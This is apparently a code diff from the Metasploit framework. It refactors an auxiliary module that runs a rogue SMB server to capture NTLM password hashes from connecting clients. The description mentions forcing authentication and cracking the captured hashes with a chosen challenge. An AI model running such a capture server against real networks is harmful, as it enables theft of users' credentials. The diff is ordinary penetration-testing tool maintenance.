@@ -8,7 +8,7 @@ require 'ruby_smb/gss/provider/ntlm'
 require 'metasploit/framework/hashes/identify'
 
 class MetasploitModule < Msf::Auxiliary
-  include ::Msf::Exploit::Remote::SocketServer
+  include ::Msf::Exploit::Remote::SMB::Server
   include ::Msf::Exploit::Remote::SMB::Server::HashCapture
 
   def initialize
@@ -17,9 +17,10 @@ class MetasploitModule < Msf::Auxiliary
       'Description' => %q{
         This module provides a SMB service that can be used to capture the challenge-response
         password NTLMv1 & NTLMv2 hashes used with SMB1, SMB2, or SMB3 client systems.
-        Responses sent by this service have by default a random 8 byte challenge string
-        of format `\x11\x22\x33\x44\x55\x66\x77\x88`, allowing for easy cracking using
-        Cain & Abel (NTLMv1) or John the ripper (with jumbo patch).
+        Responses sent by this service by default use a random 8 byte challenge string.
+        A specific value (such as `1122334455667788`) can be set using the CHALLENGE option,
+        allowing for easy cracking using Cain & Abel (NTLMv1) or John the Ripper
+        (with jumbo patch).
 
         To exploit this, the target system must try to authenticate to this
         module. One way to force an SMB authentication attempt is by embedding
@@ -59,20 +60,7 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('SMBServerIdleTimeout')
   end
 
-  def run
-    @rsock = Rex::Socket::Tcp.create(
-      'LocalHost' => bindhost,
-      'LocalPort' => bindport,
-      'Comm' => _determine_server_comm(bindhost),
-      'Server' => true,
-      'Timeout' => datastore['TIMEOUT'],
-      'Context' =>
-        {
-          'Msf' => framework,
-          'MsfExploit' => self
-        }
-    )
-
+  def start_service(opts = {})
     ntlm_provider = HashCaptureNTLMProvider.new(
       listener: self
     )
@@ -82,39 +70,15 @@ class MetasploitModule < Msf::Auxiliary
     ntlm_provider.dns_hostname = datastore['SMBDomain']
     ntlm_provider.netbios_domain = datastore['SMBDomain']
     ntlm_provider.netbios_hostname = datastore['SMBDomain']
-
     validate_smb_hash_capture_datastore(datastore, ntlm_provider)
+    opts[:gss_provider] = ntlm_provider
 
-    server = RubySMB::Server.new(
-      server_sock: @rsock,
-      gss_provider: ntlm_provider
-    )
-
-    print_status("Server is running. Listening on #{bindhost}:#{bindport}")
-
-    server.run do
-      print_line
-      print_good 'Received SMB connection on Auth Capture Server!'
-      true
-    end
+    super(opts)
   end
 
-  def on_ntlm_type3(address:, ntlm_type1:, ntlm_type2:, ntlm_type3:)
-    report_ntlm_type3(
-      address: address,
-      ntlm_type1: ntlm_type1,
-      ntlm_type2: ntlm_type2,
-      ntlm_type3: ntlm_type3
-    )
+  def on_client_connect(client)
+    print_good('Received SMB connection on Auth Capture Server!')
   end
 
-  def cleanup
-    begin
-      @rsock.close if @rsock
-    rescue StandardError => e
-      elog('Failed closing SMB server socket', error: e)
-    end
-
-    super
-  end
+  alias :run :exploit
 end
